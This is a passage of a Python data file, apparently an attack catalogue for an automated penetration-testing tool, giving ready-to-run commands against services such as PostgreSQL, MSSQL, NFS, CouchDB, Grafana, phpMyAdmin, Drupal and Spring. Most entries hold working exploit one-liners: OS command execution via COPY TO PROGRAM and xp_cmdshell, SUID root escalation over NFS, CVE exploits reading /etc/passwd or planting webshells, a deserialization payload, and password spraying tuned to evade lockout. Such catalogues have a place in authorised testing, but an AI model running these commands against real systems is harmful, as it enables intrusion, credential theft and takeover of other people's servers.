        "expected_evidence": "Community string found; snmpwalk returns system information",
        "false_positive_notes": "SNMP may be blocked by firewall; use UDP explicitly in nmap (-sU -p 161)",
    },
    {
        "id": "snmp_write_access",
        "service": "snmp",
        "ports": [161],
        "attack_name": "SNMP write community string abuse",
        "description": (
            "If the 'private' or a custom write community string is found, "
            "an attacker can modify device configuration, change routes, or disable interfaces."
        ),
        "preconditions": ["UDP port 161 open", "Write community string known"],
        "tools": ["snmpset", "nmap"],
        "quick_command": "snmpset -v2c -c private TARGET sysName.0 s 'pwned'",
        "cve_refs": [],
        "mitre_technique": "T1565.001",
        "severity": "CRITICAL",
        "expected_evidence": "sysName or other MIB OID successfully modified",
        "false_positive_notes": "Write access usually restricted; verify before attempting configuration changes",
    },

    # =========================================================
    # SMTP  (port 25 / 587)
    # =========================================================
    {
        "id": "smtp_user_enum",
        "service": "smtp",
        "ports": [25, 587],
        "attack_name": "SMTP user enumeration (VRFY / EXPN / RCPT)",
        "description": (
            "SMTP VRFY, EXPN, and RCPT TO commands can be used to enumerate valid email addresses "
            "without authentication on misconfigured mail servers."
        ),
        "preconditions": ["Port 25 or 587 open"],
        "tools": ["smtp-user-enum", "nmap --script smtp-enum-users"],
        "quick_command": "smtp-user-enum -M VRFY -U users.txt -t TARGET",
        "cve_refs": [],
        "mitre_technique": "T1589.002",
        "severity": "MEDIUM",
        "expected_evidence": "252 or 250 response confirms valid user; 550 rejects invalid user",
        "false_positive_notes": "Many modern MTAs return 252 for all VRFY queries to prevent enumeration",
    },
    {
        "id": "smtp_open_relay",
        "service": "smtp",
        "ports": [25],
        "attack_name": "SMTP open relay test",
        "description": (
            "An open relay accepts and forwards mail from any source to any destination, "
            "enabling spam, phishing campaigns, and domain reputation damage."
        ),
        "preconditions": ["Port 25 open"],
        "tools": ["nmap --script smtp-open-relay", "swaks"],
        "quick_command": "nmap -p 25 --script smtp-open-relay TARGET",
        "cve_refs": [],
        "mitre_technique": "T1566.002",
        "severity": "HIGH",
        "expected_evidence": "250 OK response to RCPT TO with external domain; mail delivered",
        "false_positive_notes": "Port 25 may be firewalled; test from external IP",
    },

    # =========================================================
    # Memcached  (port 11211)
    # =========================================================
    {
        "id": "memcached_no_auth",
        "service": "memcache",
        "ports": [11211],
        "attack_name": "Memcached unauthenticated access / data dump",
        "description": (
            "Memcached has no authentication by default. Exposed instances allow reading "
            "all cached data (sessions, tokens, sensitive application data) and cache poisoning."
        ),
        "preconditions": ["Port 11211 open"],
        "tools": ["telnet", "nc", "memcdump"],
        "quick_command": "echo 'stats items' | nc -q1 TARGET 11211",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "STAT responses returned; keys readable via 'stats cachedump'",
        "false_positive_notes": "Memcached should only listen on 127.0.0.1; external exposure is a misconfiguration",
    },

    # =========================================================
    # PostgreSQL  (port 5432)
    # =========================================================
    {
        "id": "postgres_default_creds",
        "service": "postgresql",
        "ports": [5432],
        "attack_name": "PostgreSQL default credentials",
        "description": (
            "PostgreSQL often ships with 'postgres'/'postgres' or no password on the superuser account. "
            "Superuser access enables OS command execution via COPY TO/FROM PROGRAM."
        ),
        "preconditions": ["Port 5432 open and remotely accessible"],
        "tools": ["psql", "hydra", "nmap --script pgsql-brute"],
        "quick_command": "psql -h TARGET -U postgres -c '\\l' 2>/dev/null || nmap -p 5432 --script pgsql-brute TARGET",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "psql prompt without password; database list returned",
        "false_positive_notes": "PostgreSQL often binds to 127.0.0.1; external access requires pg_hba.conf change",
    },
    {
        "id": "postgres_rce_copy_program",
        "service": "postgresql",
        "ports": [5432],
        "attack_name": "PostgreSQL OS command execution via COPY TO PROGRAM",
        "description": (
            "With superuser access, COPY TO PROGRAM executes OS commands as the postgres user. "
            "Combined with default creds or SQLi, this achieves RCE."
        ),
        "preconditions": ["PostgreSQL superuser access"],
        "tools": ["psql"],
        "quick_command": "psql -h TARGET -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/rce.txt'\"",
        "cve_refs": [],
        "mitre_technique": "T1059.004",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output written; shell access as postgres user",
        "false_positive_notes": "Requires superuser; restricted on managed cloud databases",
    },
    {
        "id": "postgres_brute",
        "service": "postgresql",
        "ports": [5432],
        "attack_name": "PostgreSQL credential brute force",
        "description": "Systematically test credentials against the PostgreSQL service.",
        "preconditions": ["Port 5432 open and remotely accessible"],
        "tools": ["hydra", "medusa", "nmap --script pgsql-brute"],
        "quick_command": "hydra -L users.txt -P passwords.txt TARGET postgres",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Valid credentials; psql session established",
        "false_positive_notes": "pg_hba.conf may restrict login methods for remote connections",
    },

    # =========================================================
    # MSSQL  (port 1433)
    # =========================================================
    {
        "id": "mssql_default_creds",
        "service": "ms-sql-s",
        "ports": [1433],
        "attack_name": "MSSQL sa account default/blank password",
        "description": (
            "The MSSQL 'sa' (system administrator) account frequently has a blank or common password. "
            "With sa access, xp_cmdshell enables OS command execution as the SQL service account."
        ),
        "preconditions": ["Port 1433 open and remotely accessible"],
        "tools": ["impacket mssqlclient.py", "sqsh", "nmap --script ms-sql-brute"],
        "quick_command": "python3 mssqlclient.py sa:@TARGET -windows-auth 2>/dev/null || nmap -p 1433 --script ms-sql-empty-password TARGET",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "SQL> prompt; xp_cmdshell enabled; OS command output",
        "false_positive_notes": "Windows auth may be required; try -windows-auth flag with impacket",
    },
    {
        "id": "mssql_xp_cmdshell",
        "service": "ms-sql-s",
        "ports": [1433],
        "attack_name": "MSSQL xp_cmdshell OS command execution",
        "description": (
            "When xp_cmdshell is enabled (or can be re-enabled by sa), "
            "any SQL query can execute arbitrary OS commands as the SQL Server service account."
        ),
        "preconditions": ["MSSQL sa or sysadmin account", "xp_cmdshell enabled or can be enabled"],
        "tools": ["impacket mssqlclient.py", "sqlmap --os-shell"],
        "quick_command": "python3 mssqlclient.py sa:Password@TARGET -q \"EXEC xp_cmdshell 'whoami'\"",
        "cve_refs": [],
        "mitre_technique": "T1059.003",
        "severity": "CRITICAL",
        "expected_evidence": "OS user returned (e.g. NT AUTHORITY\\SYSTEM or domain\\svcaccount)",
        "false_positive_notes": "xp_cmdshell disabled by default since SQL Server 2005; re-enable with sp_configure",
    },
    {
        "id": "mssql_brute",
        "service": "ms-sql-s",
        "ports": [1433],
        "attack_name": "MSSQL credential brute force",
        "description": "Systematically test credentials against MSSQL using SQL or Windows authentication.",
        "preconditions": ["Port 1433 open and remotely accessible"],
        "tools": ["hydra", "nmap --script ms-sql-brute", "medusa"],
        "quick_command": "nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Valid credentials; authenticated MSSQL session",
        "false_positive_notes": "Windows authentication uses domain creds; SQL auth must be explicitly enabled",
    },

    # =========================================================
    # VNC  (port 5900)
    # =========================================================
    {
        "id": "vnc_no_auth",
        "service": "vnc",
        "ports": [5900, 5901, 5902],
        "attack_name": "VNC unauthenticated / no-password access",
        "description": (
            "VNC servers configured without a password grant full graphical desktop access. "
            "Direct screen control enables credential theft, file access, and pivoting."
        ),
        "preconditions": ["Port 5900+ open"],
        "tools": ["vncviewer", "nmap --script vnc-info"],
        "quick_command": "nmap -p 5900 --script vnc-info,vnc-brute TARGET",
        "cve_refs": [],
        "mitre_technique": "T1021.005",
        "severity": "CRITICAL",
        "expected_evidence": "Desktop visible without password prompt in VNC viewer",
        "false_positive_notes": "VNC may require a tunnel (SSH port forward) if firewall blocks direct access",
    },
    {
        "id": "vnc_brute",
        "service": "vnc",
        "ports": [5900, 5901],
        "attack_name": "VNC password brute force",
        "description": "VNC passwords are often short (8-char max in RFB protocol) and easy to brute force.",
        "preconditions": ["Port 5900 open", "Authentication enabled"],
        "tools": ["hydra", "ncrack", "medusa"],
        "quick_command": "hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://TARGET",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Password found; VNC session established",
        "false_positive_notes": "RFB limits passwords to 8 characters; use rockyou limited to ≤8 char entries",
    },

    # =========================================================
    # Telnet  (port 23)
    # =========================================================
    {
        "id": "telnet_cleartext",
        "service": "telnet",
        "ports": [23],
        "attack_name": "Telnet cleartext credential interception",
        "description": (
            "Telnet transmits all data including credentials in cleartext. "
            "Any network-level MITM position allows credential harvesting and session hijacking."
        ),
        "preconditions": ["Port 23 open", "Network MITM or packet capture position"],
        "tools": ["wireshark", "tcpdump", "ettercap"],
        "quick_command": "tcpdump -i eth0 -A 'port 23' | grep -E 'login|password|pass'",
        "cve_refs": [],
        "mitre_technique": "T1040",
        "severity": "HIGH",
        "expected_evidence": "Credentials visible in cleartext in packet capture",
        "false_positive_notes": "Requires network access; telnet should be replaced with SSH",
    },
    {
        "id": "telnet_brute",
        "service": "telnet",
        "ports": [23],
        "attack_name": "Telnet credential brute force",
        "description": "Telnet rarely enforces lockout policies, making it vulnerable to credential brute force.",
        "preconditions": ["Port 23 open"],
        "tools": ["hydra", "medusa"],
        "quick_command": "hydra -L users.txt -P passwords.txt telnet://TARGET",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Shell prompt returned with valid credentials",
        "false_positive_notes": "Network devices may have very slow response times; increase timeout",
    },

    # =========================================================
    # LDAP  (port 389 / 636)
    # =========================================================
    {
        "id": "ldap_anonymous_bind",
        "service": "ldap",
        "ports": [389, 636],
        "attack_name": "LDAP anonymous bind — directory enumeration",
        "description": (
            "Anonymous LDAP binds allow unauthenticated enumeration of users, groups, "
            "OUs, and password policies — essential for AD reconnaissance."
        ),
        "preconditions": ["Port 389 or 636 open", "Anonymous bind enabled"],
        "tools": ["ldapsearch", "nmap --script ldap-search", "enum4linux"],
        "quick_command": "ldapsearch -x -H ldap://TARGET -b '' -s base namingContexts && ldapsearch -x -H ldap://TARGET -b 'dc=domain,dc=com' '(objectClass=user)' sAMAccountName",
        "cve_refs": [],
        "mitre_technique": "T1087.002",
        "severity": "HIGH",
        "expected_evidence": "User list, group memberships, and password policy returned without credentials",
        "false_positive_notes": "Many AD deployments restrict anonymous bind; authenticated bind may still work",
    },
    {
        "id": "ldap_password_spray",
        "service": "ldap",
        "ports": [389],
        "attack_name": "LDAP password spray (Active Directory)",
        "description": (
            "Spraying one or two passwords across all enumerated AD usernames avoids lockout "
            "while covering a large credential surface against corporate accounts."
        ),
        "preconditions": ["Port 389 open", "AD user list obtained"],
        "tools": ["kerbrute", "sprayhound", "ldapdomaindump"],
        "quick_command": "kerbrute passwordspray -d DOMAIN.COM --dc TARGET users.txt 'Password123!'",
        "cve_refs": [],
        "mitre_technique": "T1110.003",
        "severity": "HIGH",
        "expected_evidence": "Valid domain credentials; Kerberos TGT obtained",
        "false_positive_notes": "Use one password per 30 minutes to stay under lockout threshold",
    },

    # =========================================================
    # NFS  (port 2049)
    # =========================================================
    {
        "id": "nfs_world_readable",
        "service": "nfs",
        "ports": [2049, 111],
        "attack_name": "NFS world-readable share mount",
        "description": (
            "NFS exports configured with no_root_squash or accessible to * allow "
            "unauthenticated mounting and reading of exported filesystems."
        ),
        "preconditions": ["Port 2049 open", "NFS export accessible to attacker IP"],
        "tools": ["showmount", "mount", "nmap --script nfs-showmount"],
        "quick_command": "showmount -e TARGET && mkdir /tmp/nfs && mount -t nfs TARGET:/export /tmp/nfs && ls -la /tmp/nfs",
        "cve_refs": [],
        "mitre_technique": "T1005",
        "severity": "HIGH",
        "expected_evidence": "Filesystem mounted; sensitive files readable (keys, configs, backups)",
        "false_positive_notes": "Export rules in /etc/exports may restrict by IP; use the scanner's source IP",
    },
    {
        "id": "nfs_root_squash_bypass",
        "service": "nfs",
        "ports": [2049],
        "attack_name": "NFS no_root_squash privilege escalation",
        "description": (
            "When no_root_squash is set, a root user on the attacker machine retains root "
            "on the NFS mount. Write a SUID binary or authorized_keys to escalate on the server."
        ),
        "preconditions": ["NFS mount writable", "no_root_squash in export options"],
        "tools": ["mount", "cp", "chmod"],
        "quick_command": "cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash",
        "cve_refs": [],
        "mitre_technique": "T1548.001",
        "severity": "CRITICAL",
        "expected_evidence": "SUID binary executes as root on target server",
        "false_positive_notes": "Requires write access to the share and no_root_squash option",
    },

    # =========================================================
    # rsync  (port 873)
    # =========================================================
    {
        "id": "rsync_unauth_access",
        "service": "rsync",
        "ports": [873],
        "attack_name": "rsync unauthenticated module access",
        "description": (
            "rsync modules without authentication allow listing and downloading "
            "arbitrary files including SSH keys, configs, and database backups."
        ),
        "preconditions": ["Port 873 open"],
        "tools": ["rsync", "nmap --script rsync-list-modules"],
        "quick_command": "rsync --list-only rsync://TARGET/ && rsync -av rsync://TARGET/module/ /tmp/rsync-dump/",
        "cve_refs": [],
        "mitre_technique": "T1005",
        "severity": "HIGH",
        "expected_evidence": "File listing returned; sensitive files downloaded without credentials",
        "false_positive_notes": "Some modules require credentials; try without first then attempt common passwords",
    },

    # =========================================================
    # CouchDB  (port 5984)
    # =========================================================
    {
        "id": "couchdb_no_auth",
        "service": "http",
        "ports": [5984],
        "attack_name": "CouchDB unauthenticated access",
        "description": (
            "CouchDB < 3.x has no authentication by default ('Admin Party'). "
            "All databases are readable and writable without credentials."
        ),
        "preconditions": ["Port 5984 open"],
        "tools": ["curl", "couchdb-dump"],
        "quick_command": "curl -s http://TARGET:5984/_all_dbs && curl -s http://TARGET:5984/_users",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "Database list returned; _users database accessible",
        "false_positive_notes": "CouchDB 3.x requires auth by default; older versions do not",
    },
    {
        "id": "couchdb_rce_cve_2017_12635",
        "service": "http",
        "ports": [5984],
        "attack_name": "CouchDB RCE via admin account creation (CVE-2017-12635)",
        "description": (
            "A JSON parsing vulnerability allows unauthenticated attackers to create a CouchDB admin "
            "account, then use CVE-2017-12636 to execute OS commands via query server config."
        ),
        "preconditions": ["CouchDB < 2.1.1", "Port 5984 open"],
        "tools": ["curl", "PoC scripts"],
        "quick_command": "curl -s -X PUT 'http://TARGET:5984/_users/org.couchdb.user:hacker' -H 'Content-Type: application/json' -d '{\"type\":\"user\",\"name\":\"hacker\",\"roles\":[\"_admin\"],\"password\":\"hacker\"}'",
        "cve_refs": ["CVE-2017-12635", "CVE-2017-12636"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Admin account created; OS command output via query server",
        "false_positive_notes": "Patched in CouchDB 2.1.1; verify version before exploitation",
    },

    # =========================================================
    # RabbitMQ  (ports 5672, 15672)
    # =========================================================
    {
        "id": "rabbitmq_default_creds",
        "service": "amqp",
        "ports": [5672, 15672],
        "attack_name": "RabbitMQ default credentials (guest/guest)",
        "description": (
            "RabbitMQ ships with 'guest'/'guest' credentials enabled for localhost. "
            "If the management UI (15672) is exposed, these often work for remote access."
        ),
        "preconditions": ["Port 15672 or 5672 open"],
        "tools": ["curl", "rabbitmqadmin", "browser"],
        "quick_command": "curl -s -u guest:guest http://TARGET:15672/api/overview | python3 -m json.tool",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "HIGH",
        "expected_evidence": "RabbitMQ management API responds; cluster info and vhosts visible",
        "false_positive_notes": "guest is restricted to localhost in default config since RabbitMQ 3.3",
    },
    {
        "id": "rabbitmq_shovel_exfil",
        "service": "amqp",
        "ports": [15672],
        "attack_name": "RabbitMQ message queue interception / exfiltration",
        "description": (
            "With management API access, an attacker can bind to queues and consume messages, "
            "intercepting application events, credentials, and sensitive payloads in transit."
        ),
        "preconditions": ["RabbitMQ management API access", "Active message queues"],
        "tools": ["rabbitmqadmin", "curl", "pika (Python)"],
        "quick_command": "curl -s -u guest:guest http://TARGET:15672/api/queues/%2F/ | python3 -m json.tool",
        "cve_refs": [],
        "mitre_technique": "T1114",
        "severity": "HIGH",
        "expected_evidence": "Queue names, message counts, and consumed message bodies",
        "false_positive_notes": "Consuming messages is destructive; use GET with ack_mode=nack_requeue_true",
    },

    # =========================================================
    # Prometheus  (port 9090)
    # =========================================================
    {
        "id": "prometheus_no_auth",
        "service": "http",
        "ports": [9090],
        "attack_name": "Prometheus unauthenticated metrics exposure",
        "description": (
            "Prometheus typically has no authentication. Exposed instances leak internal "
            "IP addresses, hostnames, service names, credentials in labels, and infrastructure topology."
        ),
        "preconditions": ["Port 9090 open"],
        "tools": ["curl", "browser"],
        "quick_command": "curl -s http://TARGET:9090/api/v1/targets | python3 -m json.tool && curl -s http://TARGET:9090/metrics | grep -i 'password\\|secret\\|token'",
        "cve_refs": [],
        "mitre_technique": "T1082",
        "severity": "MEDIUM",
        "expected_evidence": "Scrape targets with internal IPs, job names, and service labels",
        "false_positive_notes": "Prometheus alertmanager on 9093 may expose further internal routing",
    },

    # =========================================================
    # Grafana  (port 3000)
    # =========================================================
    {
        "id": "grafana_default_creds",
        "service": "http",
        "ports": [3000],
        "attack_name": "Grafana default admin credentials",
        "description": (
            "Grafana ships with admin/admin as default credentials. Authenticated access "
            "exposes datasource credentials (DB passwords, API keys) via the API."
        ),
        "preconditions": ["Port 3000 open"],
        "tools": ["curl", "browser"],
        "quick_command": "curl -s -u admin:admin http://TARGET:3000/api/datasources | python3 -m json.tool",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "HIGH",
        "expected_evidence": "Datasource list with credentials; dashboard data visible",
        "false_positive_notes": "Newer Grafana forces password change on first login; try admin:admin first",
    },
    {
        "id": "grafana_path_traversal_cve_2021_43798",
        "service": "http",
        "ports": [3000],
        "attack_name": "Grafana arbitrary file read (CVE-2021-43798)",
        "description": (
            "Grafana 8.0.0-8.3.0 allows unauthenticated path traversal via the plugin "
            "static file server, enabling reading of /etc/passwd, Grafana secrets, and DB files."
        ),
        "preconditions": ["Grafana 8.0.0-8.3.0", "Port 3000 open"],
        "tools": ["curl", "nuclei"],
        "quick_command": "curl -s 'http://TARGET:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd'",
        "cve_refs": ["CVE-2021-43798"],
        "mitre_technique": "T1005",
        "severity": "HIGH",
        "expected_evidence": "/etc/passwd contents or grafana.db returned in response",
        "false_positive_notes": "Patched in Grafana 8.3.1; verify version first",
    },

    # =========================================================
    # phpMyAdmin  (port 80 / 443)
    # =========================================================
    {
        "id": "phpmyadmin_default_creds",
        "service": "http",
        "ports": [80, 443, 8080],
        "attack_name": "phpMyAdmin default credentials / open access",
        "description": (
            "phpMyAdmin instances with default credentials (root/root, root/) give full "
            "MySQL access including INTO OUTFILE webshell creation."
        ),
        "preconditions": ["/phpmyadmin path accessible", "Login form reachable"],
        "tools": ["browser", "curl", "hydra"],
        "quick_command": "curl -s http://TARGET/phpmyadmin/ | grep -i 'version\\|phpMyAdmin'",
        "cve_refs": [],
        "mitre_technique": "T1078.001",
        "severity": "CRITICAL",
        "expected_evidence": "phpMyAdmin dashboard accessible; database list visible",
        "false_positive_notes": "Many hosts restrict phpMyAdmin to 127.0.0.1; check common paths (/pma, /dbadmin)",
    },
    {
        "id": "phpmyadmin_cve_2018_12613",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "phpMyAdmin RCE via LFI (CVE-2018-12613)",
        "description": (
            "phpMyAdmin 4.8.0-4.8.1 allows authenticated LFI via the ?target parameter, "
            "enabling RCE by including a session file containing PHP code."
        ),
        "preconditions": ["phpMyAdmin 4.8.0-4.8.1", "Any valid MySQL credentials"],
        "tools": ["curl", "burpsuite"],
        "quick_command": "curl -s 'http://TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd'",
        "cve_refs": ["CVE-2018-12613"],
        "mitre_technique": "T1059.004",
        "severity": "CRITICAL",
        "expected_evidence": "/etc/passwd included in page; PHP webshell executable",
        "false_positive_notes": "Requires authenticated session; chain with default credentials",
    },

    # =========================================================
    # WordPress  (port 80 / 443)
    # =========================================================
    {
        "id": "wordpress_user_enum",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "WordPress user enumeration",
        "description": (
            "WordPress REST API and author archives expose valid usernames. "
            "Enumerated usernames can be targeted with credential attacks against wp-login.php."
        ),
        "preconditions": ["WordPress site detected"],
        "tools": ["wpscan", "curl"],
        "quick_command": "wpscan --url http://TARGET --enumerate u && curl -s http://TARGET/?author=1",
        "cve_refs": [],
        "mitre_technique": "T1589.003",
        "severity": "MEDIUM",
        "expected_evidence": "Author page redirects reveal usernames; REST API returns user list",
        "false_positive_notes": "User enumeration can be blocked by security plugins; try /?author=1 manually",
    },
    {
        "id": "wordpress_xmlrpc_brute",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "WordPress XML-RPC credential brute force",
        "description": (
            "The WordPress XML-RPC endpoint (xmlrpc.php) allows testing multiple credentials "
            "in a single request via system.multicall, enabling fast brute force without lockout."
        ),
        "preconditions": ["WordPress site", "xmlrpc.php accessible"],
        "tools": ["wpscan", "burpsuite", "hydra"],
        "quick_command": "wpscan --url http://TARGET --passwords /usr/share/wordlists/rockyou.txt --usernames admin -t 5",
        "cve_refs": [],
        "mitre_technique": "T1110.001",
        "severity": "HIGH",
        "expected_evidence": "Valid credentials found; authenticated wp-admin access",
        "false_positive_notes": "system.multicall allows 100+ attempts per request; WAF may block",
    },
    {
        "id": "wordpress_plugin_rce",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "WordPress vulnerable plugin / theme exploitation",
        "description": (
            "Outdated WordPress plugins and themes frequently contain LFI, SQLi, XSS, "
            "and RCE vulnerabilities. WPScan identifies installed versions against the WPVulnDB."
        ),
        "preconditions": ["WordPress site", "Outdated plugins installed"],
        "tools": ["wpscan", "nuclei"],
        "quick_command": "wpscan --url http://TARGET --enumerate p,t --api-token YOUR_TOKEN",
        "cve_refs": [],
        "mitre_technique": "T1190",
        "severity": "HIGH",
        "expected_evidence": "Vulnerable plugin/theme identified with CVE; exploit path confirmed",
        "false_positive_notes": "Requires WPScan API token for CVE matching; free tier limited to 75 requests/day",
    },

    # =========================================================
    # Drupal  (port 80 / 443)
    # =========================================================
    {
        "id": "drupal_drupalgeddon2",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "Drupalgeddon2 RCE (CVE-2018-7600)",
        "description": (
            "A critical RCE in Drupal's Form API allows unauthenticated code execution "
            "via a crafted POST request to user registration, password reset, or contact forms."
        ),
        "preconditions": ["Drupal 6.x < 6.38, 7.x < 7.59, 8.x < 8.4.8 or 8.5.3"],
        "tools": ["drupalgeddon2.py", "msf exploit/unix/webapp/drupal_drupalgeddon2"],
        "quick_command": "python3 drupalgeddon2.py http://TARGET/",
        "cve_refs": ["CVE-2018-7600"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output in HTTP response; webshell deployed",
        "false_positive_notes": "Most maintained Drupal instances are patched; verify version via CHANGELOG.txt",
    },
    {
        "id": "drupal_openid_rce",
        "service": "http",
        "ports": [80, 443],
        "attack_name": "Drupalgeddon3 RCE via CSRF (CVE-2018-7602)",
        "description": (
            "A follow-up to Drupalgeddon2 affecting Drupal 7.x and 8.x that allows "
            "authenticated RCE via the node deletion endpoint when CSRF tokens can be bypassed."
        ),
        "preconditions": ["Drupal 7.x < 7.59 or 8.x < 8.5.3", "Any authenticated session"],
        "tools": ["PoC exploit scripts", "msf"],
        "quick_command": "python3 CVE-2018-7602.py -c 'id' http://TARGET/ user password",
        "cve_refs": ["CVE-2018-7602"],
        "mitre_technique": "T1190",
        "severity": "HIGH",
        "expected_evidence": "OS command output via authenticated exploit chain",
        "false_positive_notes": "Requires authenticated access; chain with registration or default creds",
    },

    # =========================================================
    # Additional HTTP attack vectors
    # =========================================================
    {
        "id": "http_xxe",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "XML External Entity (XXE) injection",
        "description": (
            "Endpoints that parse XML input without disabling external entity processing "
            "can be exploited to read local files, probe internal services, or perform SSRF."
        ),
        "preconditions": ["XML-accepting endpoint or file upload", "External entity processing enabled"],
        "tools": ["burpsuite", "xxeinjector", "curl"],
        "quick_command": "curl -s -X POST http://TARGET/api/xml -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>'",
        "cve_refs": [],
        "mitre_technique": "T1059.007",
        "severity": "HIGH",
        "expected_evidence": "/etc/passwd content or internal service response in XML error or response body",
        "false_positive_notes": "Modern XML parsers disable XXE by default; explicitly check FEATURE_SECURE_PROCESSING",
    },
    {
        "id": "http_ssti",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Server-Side Template Injection (SSTI)",
        "description": (
            "User input rendered inside a server-side template (Jinja2, Twig, Freemarker) "
            "can execute arbitrary code. A common test payload is {{7*7}} → 49 in the response."
        ),
        "preconditions": ["Web app with template rendering", "User input reflected in template context"],
        "tools": ["tplmap", "burpsuite"],
        "quick_command": "python3 tplmap.py -u 'http://TARGET/page?name=test' --os-shell",
        "cve_refs": [],
        "mitre_technique": "T1059.007",
        "severity": "CRITICAL",
        "expected_evidence": "Mathematical expression evaluated (49); OS command output via template",
        "false_positive_notes": "Different template engines use different syntax; probe with {{7*7}}, ${7*7}, #{7*7}",
    },
    {
        "id": "http_deserialization",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Insecure Java/PHP deserialization RCE",
        "description": (
            "Applications deserializing untrusted data (Java ObjectInputStream, PHP unserialize) "
            "can be exploited to execute arbitrary code via gadget chains in the classpath."
        ),
        "preconditions": ["Java or PHP application", "User-controlled serialized data in request"],
        "tools": ["ysoserial", "phpggc", "burpsuite"],
        "quick_command": "java -jar ysoserial.jar CommonsCollections6 'id' | base64 | curl -s -X POST http://TARGET/api -d @-",
        "cve_refs": [],
        "mitre_technique": "T1059.007",
        "severity": "CRITICAL",
        "expected_evidence": "OS command output returned; OOB DNS/HTTP callback received",
        "false_positive_notes": "Requires a matching gadget chain; test multiple ysoserial payloads",
    },
    {
        "id": "http_spring4shell",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "Spring4Shell RCE (CVE-2022-22965)",
        "description": (
            "Spring Framework 5.3.x < 5.3.18 / 5.2.x < 5.2.20 running on JDK 9+ with Tomcat "
            "allows unauthenticated RCE via a class property manipulation in data binding."
        ),
        "preconditions": ["Spring MVC app on JDK 9+", "Deployed as WAR on Tomcat"],
        "tools": ["curl", "nuclei", "msf exploit/multi/http/spring_framework_rce_spring4shell"],
        "quick_command": "curl -s -X POST 'http://TARGET/vulnerable' -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(\"j\".equals(request.getParameter(\"pwd\")))%7B...%7D'",
        "cve_refs": ["CVE-2022-22965"],
        "mitre_technique": "T1190",
        "severity": "CRITICAL",
        "expected_evidence": "Webshell file written to Tomcat webroot; OS command execution confirmed",
        "false_positive_notes": "Does not affect Spring Boot running as JAR (embedded Tomcat); WAR deployment required",
    },
    {
        "id": "http_jwt_none",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "JWT 'none' algorithm / signature bypass",
        "description": (
            "Some JWT libraries accept 'none' as the algorithm, allowing attackers to forge tokens "
            "with arbitrary claims by simply removing the signature."
        ),
        "preconditions": ["Application uses JWTs", "Bearer token visible in requests"],
        "tools": ["jwt_tool", "burpsuite", "python3"],
        "quick_command": "python3 jwt_tool.py <TOKEN> -X a",
        "cve_refs": [],
        "mitre_technique": "T1550.001",
        "severity": "CRITICAL",
        "expected_evidence": "Token accepted with admin/elevated claims; sensitive API endpoints accessible",
        "false_positive_notes": "Modern libraries reject 'none' alg; also try alg confusion (RS256 → HS256 with public key)",
    },
    {
        "id": "http_graphql_introspection",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "GraphQL introspection — full schema disclosure",
        "description": (
            "GraphQL introspection is often left enabled in production, exposing the complete "
            "API schema including queries, mutations, types, and field names useful for targeted attacks."
        ),
        "preconditions": ["GraphQL endpoint accessible (/graphql, /api/graphql)"],
        "tools": ["graphw00f", "burpsuite", "altair"],
        "quick_command": "curl -s -X POST http://TARGET/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' | python3 -m json.tool",
        "cve_refs": [],
        "mitre_technique": "T1590",
        "severity": "MEDIUM",
        "expected_evidence": "Full schema returned; mutation names and field types visible",
        "false_positive_notes": "Disable introspection in production; some APIs use query depth limiting instead",
    },
    {
        "id": "http_cors_misconfiguration",
        "service": "http",
        "ports": [80, 443, 8080, 8000, 8443],
        "attack_name": "CORS misconfiguration — credential theft via cross-origin request",
        "description": (
            "APIs that reflect arbitrary Origins with Access-Control-Allow-Credentials: true "
            "allow malicious pages to make authenticated cross-origin requests and read responses."
        ),
        "preconditions": ["API with CORS headers", "Application uses cookies or Authorization headers"],
        "tools": ["curl", "cors-scanner", "burpsuite"],
        "quick_command": "curl -sI -H 'Origin: https://evil.com' http://TARGET/api/user | grep -i 'access-control'",
        "cve_refs": [],
        "mitre_technique": "T1185",
        "severity": "HIGH",
        "expected_evidence": "Access-Control-Allow-Origin: https://evil.com with Allow-Credentials: true",
        "false_positive_notes": "Origin reflection alone is not exploitable; must be paired with Allow-Credentials",
    },
    {
        "id": "http_request_smuggling",
        "service": "http",
